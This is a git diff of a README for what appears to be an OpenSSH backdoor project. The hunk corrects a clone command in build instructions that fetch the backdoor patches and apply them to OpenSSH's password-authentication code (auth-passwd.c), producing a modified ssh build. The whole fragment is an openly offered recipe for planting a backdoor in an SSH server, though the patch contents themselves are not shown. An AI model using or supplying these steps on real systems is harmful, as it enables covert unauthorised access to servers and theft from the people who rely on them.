@@ -11,7 +11,7 @@ The following commands when issued will patch OpenSSH and produce a modified ssh
 
 ```
 git clone https://github.com/openssh/openssh-portable
-https://github.com/Psmths/openssh-backdoor
+git clone https://github.com/Psmths/openssh-backdoor
 cp ./openssh-backdoor/*.patch ./openssh-portable/
 cd openssh-portable/
 patch -u auth-passwd.c -i auth-passwd.c.patch
